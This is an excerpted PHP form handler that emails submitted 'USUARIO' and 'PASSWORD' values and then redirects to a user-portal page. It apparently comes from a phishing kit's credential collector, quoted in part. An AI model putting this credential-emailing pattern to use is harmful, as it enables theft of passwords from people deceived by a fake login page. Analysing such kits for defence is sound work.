...
function emailFormSubmission()
{
	...
	$message .= '<tr><td valign="top" style="background-color: #ffffff;"><b>USUARIO:</b></td><td>' . htmlentities($_REQUEST["custom_U681"],ENT_COMPAT,'UTF-8') . '</td></tr>';
	$message .= '<tr><td valign="top" style="background-color: #ffffff;"><b>PASSWORD:</b></td><td>' . htmlentities($_REQUEST["Email"],ENT_COMPAT,'UTF-8') . '</td></tr>';
	...
	if($sent)
	{
		echo '{"FormResponse": { "success": true,"redirect":"portal-de-usuario.html"}}';
